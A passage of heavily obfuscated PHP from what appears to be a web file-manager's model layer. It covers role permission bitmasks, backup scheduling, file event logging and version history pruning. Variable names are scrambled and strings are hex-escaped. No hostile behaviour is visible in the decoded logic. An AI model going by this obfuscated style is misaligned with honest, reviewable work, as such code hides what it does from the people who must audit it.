$ÛáÓøÍ[$×ß«Ÿ™œ[413]]) { $²üÁù– = $ÛáÓøÍ; } } return $²üÁù– ? $²üÁù–[$×ß«Ÿ™œ[399]] : $×ß«Ÿ™œ[12]; } public function listData($ó°«íÛü = false, $ö¨ğğá = "\163\x6f\x72\x74", $ÓÀÛéñ“ = false) { return parent::listData($ó°«íÛü, $ö¨ğğá, $ÓÀÛéñ“); } public function update($®£¥¶¢¤, $øÏÚàü¾) { $ïßùÖêö =& $_SERVER[ßğøİ]; $Ïá¥Îğ = parent::listData($®£¥¶¢¤); $ºâÕäøÆ = $this->findByName($øÏÚàü¾[$ïßùÖêö[32]]); if (!$Ïá¥Îğ || $ºâÕäøÆ && $ºâÕäøÆ[$ïßùÖêö[399]] != $Ïá¥Îğ[$ïßùÖêö[399]]) { return !1; } $this->filterAuth($øÏÚàü¾[$ïßùÖêö[413]]); return parent::update($®£¥¶¢¤, $øÏÚàü¾); } public function remove($ŠéĞéñ) { $Ó‡Ş‡ĞÙ = parent::listData($ŠéĞéñ); if (!$Ó‡Ş‡ĞÙ || $Ó‡Ş‡ĞÙ[$_SERVER[ßğøİ][1276]]) { return !1; } return parent::remove($ŠéĞéñ); } public function add($ºÙ¸Ë‹† = array()) { $¶ª¢†ô =& $_SERVER[ßğøİ]; if ($this->findByName($ºÙ¸Ë‹†[$¶ª¢†ô[32]])) { return !1; } $œÈÜúé = array($¶ª¢†ô[32] => $¶ª¢†ô[12], $¶ª¢†ô[413] => 1, $¶ª¢†ô[1851] => $¶ª¢†ô[1838], $¶ª¢†ô[1850] => 1, $¶ª¢†ô[1276] => 0, $¶ª¢†ô[1852] => 0); $ºÙ¸Ë‹† = array_merge($œÈÜúé, $ºÙ¸Ë‹†); $ºÙ¸Ë‹†[$¶ª¢†ô[1852]] = $this->getSort(); $this->filterAuth($ºÙ¸Ë‹†[$¶ª¢†ô[413]]); return parent::insert($ºÙ¸Ë‹†); } private function getSort() { $¼“ºØ“• =& $_SERVER[ßğøİ]; $Ã ß¥‚ø = parent::listData(); $œ‰¡µÖı = array_to_keyvalue($Ã ß¥‚ø, $¼“ºØ“•[12], $¼“ºØ“•[1852]); return empty($œ‰¡µÖı) ? 0 : max($œ‰¡µÖı) + 1; } private function filterAuth(&$ñÑÄë×¾) { if (!$ñÑÄë×¾) { return; } $·â±¿Á = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $›áÉÆ»¨ = array(); foreach ($·â±¿Á as $ÖşËú¼ ) { if ($ñÑÄë×¾ & $ÖşËú¼ ) { $›áÉÆ»¨[] = $ÖşËú¼ ; } } if (in_array(self::AUTH_ROOT, $›áÉÆ»¨)) { $ñÑÄë×¾ = array_sum($·â±¿Á); return; } $ñ¬›À¯ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($›áÉÆ»¨ as $ÖşËú¼ ) { if (isset($ñ¬›À¯[$ÖşËú¼ ])) { $›áÉÆ»¨ = array_merge($›áÉÆ»¨, $ñ¬›À¯[$ÖşËú¼ ]); } } $›áÉÆ»¨[] = self::AUTH_SHOW; $ñÑÄë×¾ = array_sum(array_unique($›áÉÆ»¨)); } public function sort($Î¼“êùË, $€âÏäÔú) { return parent::update($Î¼“êùË, $€âÏäÔú); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\142\x61\x63\153\x75\160\114\151\x73\164"; public $field = array("\x69\157", "\x6e\141\x6d\145", "\x73\x74\141\x74\165\x73", "\x63\x6f\x6e\x74\145\x6e\164", "\x6d\x61\156\165\x61\x6c", "\x72\145\163\x75\x6c\x74", "\x74\151\x6d\x65\106\x72\157\x6d", "\164\x69\x6d\145\x54\157"); public function config() { $áíµÅ¤³ =& $_SERVER[ßğøİ]; $€ø«Öüº = Model($áíµÅ¤³[767])->get($áíµÅ¤³[777]); $€ø«Öüº = json_decode($€ø«Öüº, !0); $€ø«Öüº = is_array($€ø«Öüº) ? $€ø«Öüº : array(); if (!isset($€ø«Öüº[$áíµÅ¤³[752]])) { $€ø«Öüº[$áíµÅ¤³[752]] = $áíµÅ¤³[88]; } unset($€ø«Öüº[$áíµÅ¤³[1625]]); Action($áíµÅ¤³[1853])->taskInit(); Model($áíµÅ¤³[1624])->cacheClear(); $ìı –úÆ = $áíµÅ¤³[1854]; $¼ ¯·²Ğ = Model($áíµÅ¤³[1855])->findByKey($áíµÅ¤³[1643], $ìı –úÆ); if (!$¼ ¯·²Ğ) { $¼ ¯·²Ğ = array(); } if (isset($¼ ¯·²Ğ[$áíµÅ¤³[203]])) { $¼ ¯·²Ğ[$áíµÅ¤³[203]] = json_decode($¼ ¯·²Ğ[$áíµÅ¤³[203]], !0); } if (isset($€ø«Öüº[$áíµÅ¤³[203]])) { $¼ ¯·²Ğ[$áíµÅ¤³[203]][$áíµÅ¤³[1628]] = $€ø«Öüº[$áíµÅ¤³[203]]; unset($€ø«Öüº[$áíµÅ¤³[203]]); } return array_merge($¼ ¯·²Ğ, $€ø«Öüº); } public function listData($½£ùĞƒÈ = false, $£Óô©ñÂ = "\155\157\144\151\146\x79\124\x69\155\x65", $ÕÂ¯’Ş­ = false) { return parent::listData($½£ùĞƒÈ, $£Óô©ñÂ, !0); } public function lastItem() { $ÏşÔÔ®“ = $this->listData(); return !empty($ÏşÔÔ®“[0]) ? $ÏşÔÔ®“[0] : null; } public function kill($ºòôú¤) { $é·’§¾Û =& $_SERVER[ßğøİ]; $ÛÔ½é³¹ = $this->listData($ºòôú¤); if (!$ÛÔ½é³¹ || empty($ÛÔ½é³¹[$é·’§¾Û[32]])) { return !0; } Task::kill($é·’§¾Û[776]); Task::kill($é·’§¾Û[797]); Task::kill($é·’§¾Û[806]); $àÄ¤û¨­ = $ÛÔ½é³¹[$é·’§¾Û[32]]; $Ù¨¿¾Š = TEMP_FILES . $é·’§¾Û[775] . $àÄ¤û¨­ . $é·’§¾Û[8]; IO::remove($Ù¨¿¾Š, !1); return $this->remove($ºòôú¤); } public function remove($¾˜¡ë·Ç) { $ô°Öş ÷ = $this->listData($¾˜¡ë·Ç); if (!$ô°Öş ÷) { return !0; } return $this->backupRemove($ô°Öş ÷); } private function backupRemove($Üœ£õÓƒ) { parent::remove($Üœ£õÓƒ[$_SERVER[ßğøİ][399]]); $¿ë¨—¯ = $this->backupPath($Üœ£õÓƒ); IO::remove($¿ë¨—¯, !1); return !0; } private function backupPath($Èï½ÑÎ‰) { $ãÇôŞ =& $_SERVER[ßğøİ]; $»ÖÛ…Œ = $Èï½ÑÎ‰[$ãÇôŞ[32]]; $‹ ı¦™Ÿ = Model($ãÇôŞ[767])->get($ãÇôŞ[768]); $—Ë£²øé = substr(md5($ãÇôŞ[769] . $‹ ı¦™Ÿ . $»ÖÛ…Œ), 0, 8); return "\x7b\x69\157\72{$Èï½ÑÎ‰[$ãÇôŞ[749]]}\175\57\144\141\x74\141\x62\x61\x73\145\x2f\x62\x61\x63\x6b\165\160\57" . $»ÖÛ…Œ . $ãÇôŞ[11] . $—Ë£²øé; } public function start() { $÷ŠïäºŠ =& $_SERVER[ßğøİ]; if ($GLOBALS[$÷ŠïäºŠ[6]][$÷ŠïäºŠ[89]][$÷ŠïäºŠ[1856]] != $÷ŠïäºŠ[88]) { return !0; } $ğÇªºŒª = $this->config(); if (!$ğÇªºŒª || $ğÇªºŒª[$÷ŠïäºŠ[1625]] != $÷ŠïäºŠ[88]) { return !1; } $¼ä—½Åò = $this->process(); foreach ($¼ä—½Åò as $Ú¥„÷ŞÍ) { if ($Ú¥„÷ŞÍ) { return Task::restart($Ú¥„÷ŞÍ[$÷ŠïäºŠ[399]]); } } $ÓÎ»’ş = new Backup(); $ä ¦é­ = $ÓÎ»’ş->db(); if ($ä ¦é­) { $ä ¦é­ = $ÓÎ»’ş->dbFile(); if ($ä ¦é­ && $ğÇªºŒª[$÷ŠïäºŠ[752]] == $÷ŠïäºŠ[197]) { $ä ¦é­ = $ÓÎ»’ş->file(); } } Backup::set(array($÷ŠïäºŠ[747] => 1, $÷ŠïäºŠ[497] => time())); return !0; } public function process() { $«ÄÖšª =& $_SERVER[ßğøİ]; $Èùâ„ = array($«ÄÖšª[755] => Task::get($«ÄÖšª[776]), $«ÄÖšª[759] => Task::get($«ÄÖšª[797]), $«ÄÖšª[199] => Task::get($«ÄÖšª[806])); $ÑóÊ¤Ú = !1; foreach ($Èùâ„ as &$“ı…„´‡) { if ($ÑóÊ¤Ú) { $“ı…„´‡ = !1; continue; } if ($“ı…„´‡) { $”Œï½í = intval(_get($“ı…„´‡, $«ÄÖšª[1660], 0)); if (time() - $”Œï½í > 7200) { Task::kill($“ı…„´‡[$«ÄÖšª[399]]); $ÑóÊ¤Ú = !0; $“ı…„´‡ = !1; } } } return $Èùâ„; } public function restore() { $ö°£¿Ğš =& $_SERVER[ßğøİ]; ActionCall($ö°£¿Ğš[1060], !0, 1); ActionCall($ö°£¿Ğš[1060], !0, 0); } } goto EÛ¿Æ²šâ·; D†Á É×À: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\x72\x63\145\x5f\x65\x76\x65\x6e\x74"; protected $dataAuto = array(array("\143\162\x65\141\x74\145\124\151\155\145", "\164\151\x6d\145", "\151\156\x73\x65\x72\164", "\146\165\x6e\143\x74\x69\157\x6e"), array("\144\145\163\x63", '', "\x69\156\163\145\x72\164\54\x75\x70\x64\x61\x74\x65\54\163\x65\154\x65\143\164", "\152\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Ë©õ¶×, $©åñÇÔà, $úû¥Åå = '') { $È€ÆÇÚ =& $_SERVER[ßğøİ]; if (!$this->eventSave) { return; } $¢ØááÎÀ = Model($È€ÆÇÚ[1327])->sourceInfo($Ë©õ¶×); if (!$¢ØááÎÀ) { return !1; } if ($this->isCacheEvent($¢ØááÎÀ, $©åñÇÔà)) { return; } if ($úû¥Åå && is_string($úû¥Åå)) { $úû¥Åå = array($È€ÆÇÚ[1867] => $úû¥Åå); } $Ê‚´Ó¥ = array($È€ÆÇÚ[417] => $Ë©õ¶×, $È€ÆÇÚ[2045] => $¢ØááÎÀ[$È€ÆÇÚ[432]], $È€ÆÇÚ[2046] => $¢ØááÎÀ[$È€ÆÇÚ[32]], $È€ÆÇÚ[519] => !empty($¢ØááÎÀ[$È€ÆÇÚ[519]]) ? $¢ØááÎÀ[$È€ÆÇÚ[519]] : $È€ÆÇÚ[12], $È€ÆÇÚ[1646] => USER_ID, $È€ÆÇÚ[422] => $©åñÇÔà, $È€ÆÇÚ[1648] => $úû¥Åå); $this->addSystemLog($©åñÇÔà, $Ê‚´Ó¥); unset($Ê‚´Ó¥[$È€ÆÇÚ[2046]], $Ê‚´Ó¥[$È€ÆÇÚ[519]]); return $this->add($Ê‚´Ó¥); } private function addSystemLog($°–·à„ì, $ÚØºï¯) { $ÂÖãÎÒ˜ =& $_SERVER[ßğøİ]; if ($°–·à„ì == $ÂÖãÎÒ˜[2047]) { $°–·à„ì = $ÚØºï¯[$ÂÖãÎÒ˜[453]][$ÂÖãÎÒ˜[2048]]; } else { if (in_array($°–·à„ì, array($ÂÖãÎÒ˜[1808], $ÂÖãÎÒ˜[2049]))) { $°–·à„ì = $ÚØºï¯[$ÂÖãÎÒ˜[453]][$ÂÖãÎÒ˜[752]]; } } $¡­½‹Ê· = array_merge($ÚØºï¯, array($ÂÖãÎÒ˜[2050] => $ÚØºï¯[$ÂÖãÎÒ˜[402]], $ÂÖãÎÒ˜[2051] => $ÚØºï¯[$ÂÖãÎÒ˜[2051]])); Hook::trigger($ÂÖãÎÒ˜[2052], $ÂÖãÎÒ˜[2053] . $°–·à„ì, $ÚØºï¯); Model($ÂÖãÎÒ˜[1772])->addLog($ÂÖãÎÒ˜[2053] . $°–·à„ì, $¡­½‹Ê·); } private function isCacheEvent($ ïÂ´ıÔ, $³æ—¾°Ÿ) { if ($ ïÂ´ıÔ[$_SERVER[ßğøİ][411]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($«ğĞáì¹, $–£Ò˜½â) { $ö»ë‡Ñï =& $_SERVER[ßğøİ]; $ïŸµãÏ‘ = Model($ö»ë‡Ñï[1327])->sourceInfo($«ğĞáì¹); $È‹ºÍÓ¦ = array($ö»ë‡Ñï[2048] => $–£Ò˜½â, $ö»ë‡Ñï[32] => $ïŸµãÏ‘[$ö»ë‡Ñï[32]]); return $this->addEvent($«ğĞáì¹, $ö»ë‡Ñï[2047], $È‹ºÍÓ¦); } public function eventFileEdit($‚÷à¹¾À) { $æ’Ò¨ÛÃ =& $_SERVER[ßğøİ]; $Ñ§½®‹¹ = array($æ’Ò¨ÛÃ[2054] => $_SERVER[$æ’Ò¨ÛÃ[2055]], $æ’Ò¨ÛÃ[2056] => strtolower(ACTION)); if (isset($GLOBALS[$æ’Ò¨ÛÃ[7]][$æ’Ò¨ÛÃ[2057]])) { $Ñ§½®‹¹[$æ’Ò¨ÛÃ[2057]] = $æ’Ò¨ÛÃ[88]; } return $this->addEvent($‚÷à¹¾À, $æ’Ò¨ÛÃ[1798], $Ñ§½®‹¹); } public function eventRecycle($à†İÛ‘, $å§ç¿¡) { return $this->addEvent($à†İÛ‘, $_SERVER[ßğøİ][2049], $å§ç¿¡); } public function eventRemove($Éİèóø™) { $¸úŒÁ® =& $_SERVER[ßğøİ]; $Ìˆ³Š´ = Model($¸úŒÁ®[1327])->sourceInfo($Éİèóø™); $¤Ñ†Õª = $Ìˆ³Š´[$¸úŒÁ®[32]]; return $this->addEvent($Ìˆ³Š´[$¸úŒÁ®[432]], $¸úŒÁ®[1797], $¤Ñ†Õª); } public function eventShare($¢ÓğÅæİ, $üÄ£Ã¼) { return $this->addEvent($¢ÓğÅæİ, $_SERVER[ßğøİ][1808], $üÄ£Ã¼); } public function eventMove($Æô­‘×Š, $ŠË¾æ‚¸, $åê ¤óö) { $ Õ²²— =& $_SERVER[ßğøİ]; $¶åŒÈ÷˜ = Model($ Õ²²—[1327]); $™ı‰İãñ = $¶åŒÈ÷˜->sourceInfo($Æô­‘×Š); $ş‡Ş¸Áá = $¶åŒÈ÷˜->sourceInfo($ŠË¾æ‚¸); $ä¸²ÆŞØ = $¶åŒÈ÷˜->sourceInfo($åê ¤óö); $ŒÚ¸å˜ß = array($ Õ²²—[1160] => $ŠË¾æ‚¸, $ Õ²²—[2058] => $ş‡Ş¸Áá[$ Õ²²—[32]], $ Õ²²—[2036] => !empty($ş‡Ş¸Áá[$ Õ²²—[519]]) ? $ş‡Ş¸Áá[$ Õ²²—[519]] : $ Õ²²—[12], $ Õ²²—[1161] => $åê ¤óö, $ Õ²²—[2059] => $ä¸²ÆŞØ[$ Õ²²—[32]], $ Õ²²—[2060] => !empty($ä¸²ÆŞØ[$ Õ²²—[519]]) ? $ä¸²ÆŞØ[$ Õ²²—[519]] : $ Õ²²—[12]); $this->addEvent($Æô­‘×Š, $ Õ²²—[557], $ŒÚ¸å˜ß); $™ı‰İãñ = $¶åŒÈ÷˜->sourceInfo($Æô­‘×Š); $ŒÚ¸å˜ß = array($ Õ²²—[402] => $™ı‰İãñ[$ Õ²²—[402]], $ Õ²²—[32] => $™ı‰İãñ[$ Õ²²—[32]]); $this->addEvent($ŠË¾æ‚¸, $ Õ²²—[2061], $ŒÚ¸å˜ß); } public function eventCopy($õ–¬ğ†©) { $this->eventCreate($õ–¬ğ†©, $_SERVER[ßğøİ][555]); } public function eventRename($ĞË‚ÉÍŒ, $ôÁãê†“, $‘ÃŞ‹Òê) { $ù°±Òª =& $_SERVER[ßğøİ]; $©ß ¥Ä“ = array($ù°±Òª[1160] => $ôÁãê†“, $ù°±Òª[1161] => $‘ÃŞ‹Òê); return $this->addEvent($ĞË‚ÉÍŒ, $ù°±Òª[1342], $©ß ¥Ä“); } public function eventAddComment($ŞşË¼òÎ, $–¢‡Íè…) { return $this->addEvent($ŞşË¼òÎ, $_SERVER[ßğøİ][2062], $–¢‡Íè…); } public function eventAddDesc($ë£ŞÄ’¶, $ÇÑ­Æğ) { return $this->addEvent($ë£ŞÄ’¶, $_SERVER[ßğøİ][2063], $ÇÑ­Æğ); } public function listBySource($ğóª˜) { $‹¢¸’ÏØ =& $_SERVER[ßğøİ]; $¹ÏøÛÃ› = Model($‹¢¸’ÏØ[1327])->sourceInfo($ğóª˜); $„á•ª·İ = array($‹¢¸’ÏØ[417] => $ğóª˜); if ($¹ÏøÛÃ›[$‹¢¸’ÏØ[410]] == $‹¢¸’ÏØ[88]) { $Ğ£»Ç‡Å = Model($‹¢¸’ÏØ[1327])->listSearchChildren($ğóª˜, 20000); $Ğ£»Ç‡Å[] = $ğóª˜ . $‹¢¸’ÏØ[378]; $„á•ª·İ = array($‹¢¸’ÏØ[402] => array($‹¢¸’ÏØ[7], $Ğ£»Ç‡Å)); } $öÍÜıë = $this->where($„á•ª·İ)->order($‹¢¸’ÏØ[2064])->selectPage(); if ($öÍÜıë[$‹¢¸’ÏØ[366]][$‹¢¸’ÏØ[367]] == 0) { $öÍÜıë[$‹¢¸’ÏØ[366]][$‹¢¸’ÏØ[367]] = 1; $öÍÜıë[$‹¢¸’ÏØ[369]] = array(array($‹¢¸’ÏØ[417] => $ğóª˜, $‹¢¸’ÏØ[2045] => $¹ÏøÛÃ›[$‹¢¸’ÏØ[432]], $‹¢¸’ÏØ[1646] => $¹ÏøÛÃ›[$‹¢¸’ÏØ[454]], $‹¢¸’ÏØ[422] => $‹¢¸’ÏØ[2065], $‹¢¸’ÏØ[423] => $¹ÏøÛÃ›[$‹¢¸’ÏØ[200]], $‹¢¸’ÏØ[1648] => $‹¢¸’ÏØ[12])); } return $this->eventListParse($öÍÜıë, $ğóª˜); } private function eventListParse($ÜÑşÁÁÆ, $¦øËÀ¬½) { $Ö¨Ê×´Ö =& $_SERVER[ßğøİ]; $ÍÂ¡Í™â = $ÜÑşÁÁÆ[$Ö¨Ê×´Ö[369]]; $ıúéîı‹ = array_to_keyvalue($ÍÂ¡Í™â, $Ö¨Ê×´Ö[12], $Ö¨Ê×´Ö[402]); $§õ°ÏŞÃ = array_to_keyvalue($ÍÂ¡Í™â, $Ö¨Ê×´Ö[12], $Ö¨Ê×´Ö[2051]); foreach ($ÍÂ¡Í™â as $õøçÆº) { $¦éÖ¿¨ = $õøçÆº[$Ö¨Ê×´Ö[453]]; if ($õøçÆº[$Ö¨Ê×´Ö[33]] == $Ö¨Ê×´Ö[557] && isset($¦éÖ¿¨[$Ö¨Ê×´Ö[1160]])) { $ıúéîı‹[] = $¦éÖ¿¨[$Ö¨Ê×´Ö[1160]] . $Ö¨Ê×´Ö[12]; $ıúéîı‹[] = $¦éÖ¿¨[$Ö¨Ê×´Ö[1161]] . $Ö¨Ê×´Ö[12]; } if ($õøçÆº[$Ö¨Ê×´Ö[33]] == $Ö¨Ê×´Ö[2061] && isset($¦éÖ¿¨[$Ö¨Ê×´Ö[402]])) { $ıúéîı‹[] = $¦éÖ¿¨[$Ö¨Ê×´Ö[402]] . $Ö¨Ê×´Ö[12]; } } $ıúéîı‹ = array_merge($ıúéîı‹, $§õ°ÏŞÃ, array($¦øËÀ¬½ . $Ö¨Ê×´Ö[12])); $ıúéîı‹ = array_unique($ıúéîı‹); $¹Æ­›’ = array_unique(array_to_keyvalue($ÍÂ¡Í™â, $Ö¨Ê×´Ö[12], $Ö¨Ê×´Ö[1655])); $É÷üò†Æ = Model($Ö¨Ê×´Ö[535])->userListInfo($¹Æ­›’); $…ÅÆî­ê = Model($Ö¨Ê×´Ö[822])->sourceListInfo($ıúéîı‹, !0); foreach ($ÍÂ¡Í™â as &$õøçÆº) { if ($õøçÆº[$Ö¨Ê×´Ö[33]] == $Ö¨Ê×´Ö[557] && isset($õøçÆº[$Ö¨Ê×´Ö[453]][$Ö¨Ê×´Ö[1160]])) { $õøçÆº[$Ö¨Ê×´Ö[453]][$Ö¨Ê×´Ö[1160]] = $…ÅÆî­ê[$õøçÆº[$Ö¨Ê×´Ö[453]][$Ö¨Ê×´Ö[1160]]]; $õøçÆº[$Ö¨Ê×´Ö[453]][$Ö¨Ê×´Ö[1161]] = $…ÅÆî­ê[$õøçÆº[$Ö¨Ê×´Ö[453]][$Ö¨Ê×´Ö[1161]]]; } if ($õøçÆº[$Ö¨Ê×´Ö[33]] == $Ö¨Ê×´Ö[2061] && isset($õøçÆº[$Ö¨Ê×´Ö[453]][$Ö¨Ê×´Ö[402]])) { $õøçÆº[$Ö¨Ê×´Ö[453]][$Ö¨Ê×´Ö[402]] = $…ÅÆî­ê[$õøçÆº[$Ö¨Ê×´Ö[453]][$Ö¨Ê×´Ö[402]]]; } $õøçÆº[$Ö¨Ê×´Ö[86]] = $…ÅÆî­ê[$õøçÆº[$Ö¨Ê×´Ö[402]]]; $õøçÆº[$Ö¨Ê×´Ö[2066]] = $…ÅÆî­ê[$õøçÆº[$Ö¨Ê×´Ö[2051]]]; if ($õøçÆº[$Ö¨Ê×´Ö[33]] == $Ö¨Ê×´Ö[1797]) { $õøçÆº[$Ö¨Ê×´Ö[2066]] = $õøçÆº[$Ö¨Ê×´Ö[86]]; $õøçÆº[$Ö¨Ê×´Ö[2051]] = $õøçÆº[$Ö¨Ê×´Ö[2066]][$Ö¨Ê×´Ö[402]]; $õøçÆº[$Ö¨Ê×´Ö[86]] = !1; $õøçÆº[$Ö¨Ê×´Ö[402]] = $Ö¨Ê×´Ö[12]; } $õøçÆº[$Ö¨Ê×´Ö[1996]] = $É÷üò†Æ[$õøçÆº[$Ö¨Ê×´Ö[1655]]]; } unset($õøçÆº); $ÜÑşÁÁÆ[$Ö¨Ê×´Ö[369]] = $ÍÂ¡Í™â; return $ÜÑşÁÁÆ; } public function removeBySource($¶¸ËÔé) { $¦¬½¢±Š = array($_SERVER[ßğøİ][417] => $¶¸ËÔé); $this->where($¦¬½¢±Š)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\x72\143\x65\137\x68\151\163\x74\x6f\162\x79"; public function historyCount($‰ó³ù÷Î) { $´êı‡ =& $_SERVER[ßğøİ]; if (!$‰ó³ù÷Î) { return array(); } if (is_string($‰ó³ù÷Î) || is_int($‰ó³ù÷Î)) { $‰ó³ù÷Î = array($‰ó³ù÷Î); } $›’ì·ç÷ = array($´êı‡[402], $´êı‡[1861] => $´êı‡[500]); $•“ñ†ã‰ = array($´êı‡[402] => array($´êı‡[7], $‰ó³ù÷Î)); $¬ÍÁ¾… = $this->field($›’ì·ç÷)->where($•“ñ†ã‰)->group($´êı‡[402])->select(); return array_to_keyvalue($¬ÍÁ¾…, $´êı‡[402], $´êı‡[500]); } public function addHistory($Ã‹Ì˜õ´, $ñ„îß§’ = '') { $Ğ„šØÅ =& $_SERVER[ßğøİ]; $Ğ™§ö–ñ = array($Ğ„šØÅ[417] => $Ã‹Ì˜õ´[$Ğ„šØÅ[402]], $Ğ„šØÅ[1646] => isset($Ã‹Ì˜õ´[$Ğ„šØÅ[456]]) ? $Ã‹Ì˜õ´[$Ğ„šØÅ[456]] : $Ã‹Ì˜õ´[$Ğ„šØÅ[454]], $Ğ„šØÅ[469] => $Ã‹Ì˜õ´[$Ğ„šØÅ[468]], $Ğ„šØÅ[585] => $Ã‹Ì˜õ´[$Ğ„šØÅ[76]], $Ğ„šØÅ[2067] => $ñ„îß§’); if ($GLOBALS[$Ğ„šØÅ[6]][$Ğ„šØÅ[89]][$Ğ„šØÅ[1209]] >= 1) { $this->historyAutoClear($Ğ™§ö–ñ[$Ğ„šØÅ[402]]); $this->add($Ğ™§ö–ñ); } Hook::trigger($Ğ„šØÅ[2068], $Ğ™§ö–ñ); Model($Ğ„šØÅ[2069])->eventFileEdit($Ã‹Ì˜õ´[$Ğ„šØÅ[402]]); } private function historyAutoClear($ıë˜×¶û) { $•ÎÂŒ•Î =& $_SERVER[ßğøİ]; $‰¾Õí ½ = Model($•ÎÂŒ•Î[767])->get($•ÎÂŒ•Î[1231]); $“²ïå®Ç = $GLOBALS[$•ÎÂŒ•Î[6]][$•ÎÂŒ•Î[89]][$•ÎÂŒ•Î[1209]]; $³«ÓıÒÛ = $‰¾Õí ½ == $•ÎÂŒ•Î[1232] ? min(5, $“²ïå®Ç) : $“²ïå®Ç; if ($“²ïå®Ç <= 1) { $³«ÓıÒÛ = 1; } if ($³«ÓıÒÛ >= 500) { return; } $àª¢Î›û = array($•ÎÂŒ•Î[417] => $ıë˜×¶û); $³·”½°Á = $this->field($•ÎÂŒ•Î[2070])->where($àª¢Î›û)->order($•ÎÂŒ•Î[2064])->select(); if (!$³·”½°Á || $³«ÓıÒÛ >= count($³·”½°Á)) { return; } $Ÿé¢ıˆ = array_to_keyvalue($³·”½°Á, $•ÎÂŒ•Î[12], $•ÎÂŒ•Î[399]); $Ÿé¢ıˆ = array_slice($Ÿé¢ıˆ, $³«ÓıÒÛ); $•Ä·¹š¢ = array_to_keyvalue($³·”½°Á, $•ÎÂŒ•Î[12], $•ÎÂŒ•Î[468]); $•Ä·¹š¢ = array_slice($•Ä·¹š¢, $³«ÓıÒÛ); if (!$Ÿé¢ıˆ || !$•Ä·¹š¢) { return; } $àª¢Î›û = array($•ÎÂŒ•Î[419] => array($•ÎÂŒ•Î[7], $Ÿé¢ıˆ)); $this->where($àª¢Î›û)->delete(); Model($•ÎÂŒ•Î[471])->remove($•Ä·¹š¢); } public function listData($·®œÈ„ƒ) { $®Ø‹–¹» =& $_SERVER[ßğøİ]; $ş°£ŸØß = array($®Ø‹–¹»[417] => $·®œÈ„ƒ); $ğ‹«õã™ = $®Ø‹–¹»[2071]; $ˆâßÒ˜… = $this->field($ğ‹«õã™)->where($ş°£ŸØß)->order($®Ø‹–¹»[2064])->selectPage(); $this->_listAppendUser($ˆâßÒ˜…[$®Ø‹–¹»[369]]); $øÊº€µû = Model($®Ø‹–¹»[767])->get($®Ø‹–¹»[1231]); $ï€ù²âí = 5; if ($øÊº€µû == $®Ø‹–¹»[1232]) { $ˆâßÒ˜…[$®Ø‹–¹»[369]] = array_slice($ˆâßÒ˜…[$®Ø‹–¹»[369]], 0, $ï€ù²âí); $ˆâßÒ˜…[$®Ø‹–¹»[366]] = array($®Ø‹–¹»[2072] => 1, $®Ø‹–¹»[2073] => 20, $®Ø‹–¹»[2074] => 1, $®Ø‹–¹»[2075] => count($ˆâßÒ˜…[$®Ø‹–¹»[369]])); } return $ˆâßÒ˜…; } protected function _listAppendUser(&$ã¨ú®‚“) { $šĞ®­¿… =& $_SERVER[ßğøİ]; $‘éîÆ›Œ = array_to_keyvalue($ã¨ú®‚“, $šĞ®­¿…[12], $šĞ®­¿…[1655]); $ÖáÄäöÜ = Model($šĞ®­¿…[535])->userListInfo($‘éîÆ›Œ); foreach ($ã¨ú®‚“ as &$ºñ²¤ñá) { $Ê¢ÚÒß— = $ºñ²¤ñá[$šĞ®­¿…[1655]]; $ºñ²¤ñá[$šĞ®­¿…[454]] = $ÖáÄäöÜ[$Ê¢ÚÒß—] ? $ÖáÄäöÜ[$Ê¢ÚÒß—] : !1; } unset($ºñ²¤ñá); } public function fileInfo($×Àô®¸¦) { $¨…‘ó¬ï =& $_SERVER[ßğøİ]; $ÉçİÌ = $this->tablePrefix; $¢Èîığ¬ = "{$ÉçİÌ}\x69\x6f\137\x66\x69\x6c\145\x20\146\x69\x6c\x65\x73\40\x6f\x6e\x20\146\x69\154\145\163\56\146\151\x6c\145\111\x44\40\75\x20\150\x69\x73\164\x6f\162\171\x2e\146\x69\x6c\145\111\x44"; return $this->alias($¨…‘ó¬ï[2076])->where(array($¨…‘ó¬ï[419] => $×Àô®¸¦))->join($¢Èîığ¬, $¨…‘ó¬ï[2077])->find(); } public function removeItem($Û¤¿‹«ü) { $°ø‡‹ =& $_SERVER[ßğøİ]; $è¤¬îå¯ = array($°ø‡‹[419] => $Û¤¿‹«ü); $„ñá÷ = $this->where($è¤¬îå¯)->find(); if ($„ñá÷) { $»œ‹¸±è = $this->where($è¤¬îå¯)->delete(); Model($°ø‡‹[471])->remove($„ñá÷[$°ø‡‹[468]]); return $»œ‹¸±è; } return !1; } public function removeBySource($¤ĞĞ„Ã‚) { $«ª®‚Î‚ =& $_SERVER[ßğøİ]; if (!$¤ĞĞ„Ã‚) { return !1; } if (!is_array($¤ĞĞ„Ã‚)) { $¤ĞĞ„Ã‚ = array($¤ĞĞ„Ã‚); } $•‚ööÍİ = array($«ª®‚Î‚[417] => array($«ª®‚Î‚[7], $¤ĞĞ„Ã‚)); $ö¯ÊĞîµ = $this->field($«ª®‚Î‚[469])->where($•‚ööÍİ)->select(); if ($ö¯ÊĞîµ) { $this->where($•‚ööÍİ)->delete(); $œ¥Šü¹İ = array_to_keyvalue($ö¯ÊĞîµ, $«ª®‚Î‚[12], $«ª®‚Î‚[468]); Model($«ª®‚Î‚[471])->remove($œ¥Šü¹İ); } return !0; } public function setDetail($¼Æ¤ïùƒ, $Êï÷©Æˆ) { $Í»Ÿ›Í =& $_SERVER[ßğøİ]; return $this->where(array($Í»Ÿ›Í[419] => $¼Æ¤ïùƒ))->save(array($Í»Ÿ›Í[2067] => $Êï÷©Æˆ)); } public function rollbackToItem($¨¬¼¢, $×¯Ùïı—) { $ßÄŒàµ´ =& 